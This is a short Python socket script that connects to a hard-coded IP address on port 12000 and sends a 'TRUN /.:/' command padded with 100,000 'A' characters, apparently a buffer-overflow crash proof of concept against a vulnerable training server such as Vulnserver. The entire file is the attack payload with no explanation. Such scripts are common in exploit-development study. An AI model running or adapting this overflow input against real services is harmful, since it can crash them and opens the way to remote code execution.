from socket import *

serverName = '150.162.217.179'
serverPort = 12000

clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))

buffer = "A" * 100000

message = 'TRUN/.:/' + buffer

clientSocket.send(message.encode())
message = message + "A" * 100000

modifiedMessage = clientSocket.recv(1024)

print('From server: ',modifiedMessage.decode())
clientSocket.close()